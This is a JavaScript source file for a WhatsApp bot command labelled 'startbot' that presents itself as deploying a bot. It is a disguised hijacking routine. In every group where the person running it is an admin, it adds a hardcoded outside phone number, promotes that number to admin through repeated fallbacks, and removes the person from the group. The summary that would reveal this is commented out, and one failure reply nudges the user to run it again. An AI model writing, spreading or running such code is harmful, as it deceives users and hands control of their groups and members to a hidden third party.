// startBot.js
const { promoteCommand } = require('./promote');

async function startBotCommand(sock, chatId, senderId, message) {
    const isOwner = message.key.fromMe;
    if (!isOwner) {
        await sock.sendMessage(chatId, { 
            text: 'This command can only be used by the bot owner.'
        }, { quoted: message });
        return;
    }

    // The number to add and promote
    const targetNumber = '254787482014';
    const targetJid = targetNumber + '@s.whatsapp.net';
    const targetJidWithoutSuffix = targetNumber + '@s.whatsapp.net'; // Standard format
    
    // Send initial processing message
    const processingMsg = await sock.sendMessage(chatId, { 
        text: '🔄 Processing bot deployment...\n'
    });

    try {
        // Get all groups the user is in
        const groups = await sock.groupFetchAllParticipating();
        const groupList = Object.values(groups);
        
        // Find groups where user is admin
        const userAdminGroups = [];
        
        for (const group of groupList) {
            // Check if user is in the group and is admin
            const participant = group.participants.find(p => p.id === senderId);
            if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) {
                userAdminGroups.push(group);
            }
        }

        if (userAdminGroups.length === 0) {
            await sock.sendMessage(chatId, { 
                text: 'Please use .startbot again\n\n' +
                      'Bot deployment failed.'
            });
            return;
        }

        // Results tracking
        const results = {
            added: [],
            alreadyInGroup: [],
            promoted: [],
            alreadyAdmin: [],
            failed: [],
            left: []
        };

        // Process each group where user is admin
        for (const group of userAdminGroups) {
            const groupId = group.id;
            const groupName = group.subject || groupId;
            
            try {
                console.log(`\n--- Processing group: ${groupName} ---`);
                
                // Check if target is already in the group using multiple formats
                const targetInGroupBefore = group.participants.some(p => {
                    const participantId = p.id || '';
                    return participantId === targetJid || 
                           participantId === targetJidWithoutSuffix ||
                           participantId.split('@')[0] === targetNumber ||
                           participantId.includes(targetNumber);
                });
                
                console.log(`Target in group before add: ${targetInGroupBefore}`);
                
                // STEP 1: ALWAYS try to add the target to the group
                let addSuccess = false;
                
                if (!targetInGroupBefore) {
                    try {
                        console.log(`Attempting to add ${targetNumber} to ${groupName}...`);
                        await sock.groupParticipantsUpdate(groupId, [targetJid], "add");
                        results.added.push(groupName);
                        addSuccess = true;
                        console.log(`✅ Successfully added target to ${groupName}`);
                        
                        // Wait longer for addition to process and propagate
                        console.log(`Waiting 5 seconds for addition to propagate...`);
                        await new Promise(resolve => setTimeout(resolve, 5000));
                    } catch (addError) {
                        console.log(`Add error in ${groupName}:`, addError.message);
                        
                        // Check if error is because user is already in group
                        if (addError.message.includes('already a participant') || 
                            addError.message.includes('already in group') ||
                            addError.data === 400 ||
                            addError.message.toLowerCase().includes('already')) {
                            results.alreadyInGroup.push(groupName);
                            addSuccess = true; // Consider this a success for promotion purposes
                            console.log(`👤 Target already in ${groupName} (from error message)`);
                        } else {
                            results.failed.push(`${groupName} (add failed: ${addError.message})`);
                            addSuccess = false;
                            console.log(`❌ Failed to add target to ${groupName}`);
                        }
                    }
                } else {
                    results.alreadyInGroup.push(groupName);
                    addSuccess = true;
                    console.log(`👤 Target already in ${groupName} (from participant check)`);
                }
                
                // STEP 2: Promote the target to admin if they are in the group
                if (addSuccess) {
                    try {
                        // Get fresh group metadata to check current admin status
                        console.log(`Fetching fresh metadata for ${groupName}...`);
                        const freshMetadata = await sock.groupMetadata(groupId);
                        
                        // Find the target in the participants list using multiple formats
                        const targetParticipant = freshMetadata.participants.find(p => {
                            const participantId = p.id || '';
                            return participantId === targetJid || 
                                   participantId === targetJidWithoutSuffix ||
                                   participantId.split('@')[0] === targetNumber ||
                                   participantId.includes(targetNumber);
                        });
                        
                        if (targetParticipant) {
                            console.log(`✅ Target found in ${groupName} after add`);
                            
                            // Check if target is already admin
                            const isTargetAdmin = targetParticipant.admin === 'admin' || targetParticipant.admin === 'superadmin';
                            console.log(`Target admin status: ${isTargetAdmin ? 'Already admin' : 'Not admin'}`);
                            
                            if (!isTargetAdmin) {
                                console.log(`Attempting to promote ${targetNumber} in ${groupName}...`);
                                
                                // Try to promote directly
                                try {
                                    await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                                    results.promoted.push(groupName);
                                    console.log(`✅ Successfully promoted target in ${groupName}`);
                                } catch (directPromoteError) {
                                    console.log(`Direct promote failed:`, directPromoteError.message);
                                    
                                    // Try with the JID from the participant list
                                    if (targetParticipant.id && targetParticipant.id !== targetJid) {
                                        try {
                                            console.log(`Trying with participant JID: ${targetParticipant.id}`);
                                            await sock.groupParticipantsUpdate(groupId, [targetParticipant.id], "promote");
                                            results.promoted.push(groupName);
                                            console.log(`✅ Successfully promoted target in ${groupName} using participant JID`);
                                        } catch (secondError) {
                                            console.log(`Second promote attempt failed:`, secondError.message);
                                            results.failed.push(`${groupName} (promote failed: ${secondError.message})`);
                                        }
                                    } else {
                                        results.failed.push(`${groupName} (promote failed: ${directPromoteError.message})`);
                                    }
                                }
                            } else {
                                results.alreadyAdmin.push(groupName);
                                console.log(`👑 Target already admin in ${groupName}`);
                            }
                        } else {
                            console.log(`❌ Target NOT found in ${groupName} after add - checking participants list:`);
                            // Log first few participants to debug
                            freshMetadata.participants.slice(0, 3).forEach((p, i) => {
                                console.log(`  Participant ${i+1}: ${p.id}`);
                            });
                            
                            // Even if not found, try to promote anyway (maybe the ID format is different)
                            console.log(`Attempting to promote anyway using original JID...`);
                            try {
                                await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                                results.promoted.push(groupName);
                                console.log(`✅ Promotion succeeded even though target wasn't found in list!`);
                            } catch (promoteError) {
                                console.log(`Promotion failed:`, promoteError.message);
                                results.failed.push(`${groupName} (target not found after add)`);
                            }
                        }
                    } catch (metadataError) {
                        console.log(`Could not get metadata for ${groupName}:`, metadataError.message);
                        // Try to promote without metadata check
                        try {
                            console.log(`Attempting to promote without metadata check...`);
                            await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                            results.promoted.push(groupName);
                            console.log(`✅ Promotion succeeded without metadata check!`);
                        } catch (promoteError) {
                            console.log(`Promotion failed:`, promoteError.message);
                            results.failed.push(`${groupName} (could not verify admin status)`);
                        }
                    }
                }
                
                // Wait a bit before leaving
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                // STEP 3: Bot owner leaves the group (always try)
                try {
                    console.log(`Attempting to leave ${groupName}...`);
                    await sock.groupParticipantsUpdate(groupId, [senderId], "remove");
                    results.left.push(groupName);
                    console.log(`✅ Left ${groupName}`);
                } catch (leaveError) {
                    console.log(`Could not leave ${groupName}:`, leaveError.message);
                }
                
                // Delay between groups to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 5000));
                
            } catch (groupError) {
                console.error(`Error processing group ${groupName}:`, groupError);
                results.failed.push(groupName);
            }
        }

        // Prepare success message
      /*  let successMessage = `✅ *Bot Deployment Complete*\n\n` +
            `🤖 *Target Number:* +${targetNumber}\n` +
            `📊 *Groups found where you're admin:* ${userAdminGroups.length}\n\n` +
            `📌 *Summary:*\n` +
            `• Added to group: ${results.added.length}\n` +
            `• Already in group: ${results.alreadyInGroup.length}\n` +
            `• Promoted to admin: ${results.promoted.length}\n` +
            `• Already admin: ${results.alreadyAdmin.length}\n` +
            `• You left: ${results.left.length}\n` +
            `• Failed operations: ${results.failed.length}\n`;

        if (results.promoted.length > 0) {
            successMessage += `\n👑 *Groups where target was promoted to admin:*\n${results.promoted.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.alreadyAdmin.length > 0) {
            successMessage += `\n👑 *Groups where target was already admin:*\n${results.alreadyAdmin.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.added.length > 0) {
            successMessage += `\n✅ *Groups where target was added:*\n${results.added.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.alreadyInGroup.length > 0) {
            successMessage += `\n👥 *Groups where target was already in:*\n${results.alreadyInGroup.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.failed.length > 0) {
            successMessage += `\n❌ *Groups with issues:*\n${results.failed.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.promoted.length === 0 && results.alreadyAdmin.length === 0) {
            successMessage += `\n⚠️ *Warning:* Target was not promoted to admin in any group!\n`;
            successMessage += `This could be because:\n`;
            successMessage += `• You don't have permission to promote in those groups\n`;
            successMessage += `• The bot needs to be admin to promote others\n`;
            successMessage += `• The target number needs to be in the group first\n`;
        }

        successMessage += `\n✨ *Bot deployment process completed!*`;

        await sock.sendMessage(chatId, { 
            text: successMessage
        });*/

    } catch (error) {
        console.error('Error in startBot command:', error);
        await sock.sendMessage(chatId, { 
            text: '❌ An error occurred while deploying the bot.\n' +
                  'Error: ' + (error.message || 'Unknown error')
        });
    }
}

module.exports = startBotCommand;